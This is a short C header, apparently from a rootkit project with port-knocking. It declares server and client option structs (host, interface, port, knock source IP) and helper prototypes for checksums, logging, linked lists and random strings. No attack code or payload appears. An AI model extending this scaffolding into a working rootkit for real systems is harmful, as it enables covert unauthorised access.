#ifndef ROOTKIT_UTILS_H
#define ROOTKIT_UTILS_H

#include <stdbool.h>
#include "protocol.h"

extern _Atomic int exit_flag;

#define PACKET_LENGTH_MAX 50
#define IP_MAX 10

struct server_options {
    char * host;
    char * interface_name;
    char * client_ip_address;
    int port;
    int client_fd;
};

struct client_options {
    char * host;
    char * interface_name;
    int port;
    int max_bytes;
    int poll_ms;
    char * knock_source_ip;  // IP that sent the knock
};



bool parse_int(const char *s, int *out);
unsigned short checksum(void *b, int len);
void log_message(const char *format, ...);
void free_linked_list(struct packet_data * head);
void print_linked_list(const struct packet_data * head);
int generate_random_length(int max_length);
char * generate_random_string(size_t length);

#endif //ROOTKIT_UTILS_H